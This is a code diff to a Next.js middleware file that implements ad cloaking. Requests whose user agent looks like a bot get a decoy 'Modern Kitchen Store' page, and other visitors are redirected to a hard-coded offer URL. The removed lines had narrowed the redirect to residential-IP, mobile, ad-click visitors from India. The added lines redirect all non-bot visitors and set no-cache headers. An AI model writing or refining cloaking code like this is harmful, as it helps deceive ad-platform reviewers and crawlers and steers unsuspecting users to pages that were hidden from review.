@@ -1,9 +1,8 @@
 // src/middleware.ts
 import { NextRequest, NextResponse } from 'next/server';
-import { detectUserAgent, isMobile, hasAdIntent } from './lib/detection';
-import { getIpAddress, analyzeIp } from './lib/ip-analyzer';
+import { detectUserAgent } from './lib/detection';
 
-const OFFER_URL = process.env.OFFER_URL || 'https://example.com';
+const OFFER_URL = 'https://dealverse-rho.vercel.app/';
 
 // --- CLOAKED PAGE HTML (Modern Kitchen Store) ---
 const getCloakedHTML = (reasons: string[]) => {
@@ -195,41 +194,25 @@ const getCloakedHTML = (reasons: string[]) => {
 `;
 };
 
-export async function middleware(request: NextRequest) {
-  const ip = getIpAddress(request);
+export function middleware(request: NextRequest) {
   const ua = request.headers.get('user-agent') || '';
-  
-  // 1. Bot Check
   const bot = detectUserAgent(ua);
+
   if (bot.isBot) {
-    return new Response(getCloakedHTML([`Bot Detected: ${bot.reason} (Showing Cloak)`]), {
-      status: 200, headers: { 'Content-Type': 'text/html; charset=UTF-8' }
+    return new Response(getCloakedHTML([]), {
+      status: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=UTF-8',
+        'Cache-Control': 'private, no-store',
+        Vary: 'User-Agent',
+      },
     });
   }
 
-  // 2. IP Analysis
-  const { isResidential, countryCode } = await analyzeIp(ip);
-
-  // 3. Target Logic
-  const isUserMobile = isMobile(ua);
-  const isAdClick = hasAdIntent(request);
-  const isIndia = countryCode === 'IN';
-
-  const logs = [
-    `Country: ${countryCode} ${isIndia ? '✅' : '❌'}`,
-    `Residential IP: ${isResidential} ${isResidential ? '✅' : '❌'}`,
-    `Mobile Device: ${isUserMobile} ${isUserMobile ? '✅' : '❌'}`,
-    `Ad Link: ${isAdClick} ${isAdClick ? '✅' : '❌'}`
-  ];
-
-  // Final Logic
-  if (isResidential && isUserMobile && isAdClick && isIndia) {
-    return NextResponse.redirect(new URL(OFFER_URL, request.url));
-  }
-
-  return new Response(getCloakedHTML(logs), {
-    status: 200, headers: { 'Content-Type': 'text/html; charset=UTF-8' }
-  });
+  const response = NextResponse.redirect(OFFER_URL, 307);
+  response.headers.set('Cache-Control', 'private, no-store');
+  response.headers.set('Vary', 'User-Agent');
+  return response;
 }
 
 export const config = { matcher: ['/'] };
